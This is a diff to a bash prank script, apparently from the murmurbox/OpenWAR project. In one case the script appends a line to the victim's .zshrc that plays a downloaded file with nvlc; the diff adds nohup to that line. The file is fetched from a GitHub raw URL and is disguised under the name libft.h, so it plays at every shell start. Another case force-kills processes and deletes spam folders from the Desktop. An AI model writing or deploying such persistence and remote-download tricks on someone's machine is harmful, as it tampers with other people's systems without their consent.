@@ -147,7 +147,7 @@ while true; do
     ;;
   666)
 	echo "" >> .zshrc
-	echo "nvlc ~/libft.h &" >> .zshrc
+	echo "nohup nvlc ~/libft.h &" >> .zshrc
     curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
     # counter=1
     # while [ $counter -le 9999 ]
@@ -171,6 +171,8 @@ while true; do
     # cc -x c libft.test && ./a.out &
     ;;
   911)
+	
+    ps aux | grep "nvlc" | awk '{print $2}' | xargs -n1 kill -9 &> /dev/null
     ps aux | grep "afplay" | awk '{print $2}' | xargs -n1 kill -9 &> /dev/null
     ps aux | grep "/Users/$USER/.murmurbox/murmurbox.bash" | awk '{print $2}' | xargs -I {} -n1 sh -c 'if [ "{}" -ne '"$$"' ]; then kill -9 "{}" &> /dev/null ; fi'
     rm -r ~/Desktop/AAAAAAAAAAAAAAGGG{0..220}
